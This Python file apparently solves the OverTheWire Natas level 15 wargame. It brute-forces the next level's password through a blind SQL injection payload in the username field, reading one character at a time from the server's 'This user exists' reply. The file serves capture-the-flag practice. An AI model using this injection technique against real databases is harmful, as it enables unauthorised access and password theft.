import string
from rich.live import Live
from rich.text import Text
from rich.console import Group, Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from .base_solver import NatasSolver
from utils.helpers import get_charset

class Natas15Solver(NatasSolver):
    def solve(self) -> str:
        try:
            password = ""
            chars = get_charset()
            console = Console()
            
            # Create progress display with consistent spacing
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console,
                expand=True
            )
            
            # Add only password progress task
            password_task = progress.add_task("[cyan]Password Progress", total=32)
            status_line = Text()
            solving_line = Text("\nSolving natas15...", style="cyan")
            
            console.print("\n[*] Starting brute force...\n")
            
            with Live(
                Group(
                    status_line,
                    Text(""),  # Empty line for spacing
                    progress,
                    solving_line  # Added solving status on new line
                ),
                console=console,
                refresh_per_second=10,
                transient=False
            ) as live:
                while len(password) < 32:
                    progress.update(password_task, completed=len(password))
                    
                    for c in chars:
                        # Update status line with current attempt
                        status_line.plain = f"Current Password: {password}\nTesting: {c}"
                        
                        payload = {
                            "username": f'natas16" AND BINARY password LIKE "{password}{c}%" #'
                        }
                        
                        response = self.make_request(
                            method="POST",
                            data=payload
                        )
                        
                        if "This user exists" in response.text:
                            password += c
                            break
                
                # Show completion
                progress.update(password_task, completed=32)
                status_line.plain = f"Found Password: {password}"
                solving_line.plain = "\nSolved natas15!"
            
            console.print(f"\n[green]✓[/green] Password found: {password}\n")
            return password
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas15: {str(e)}")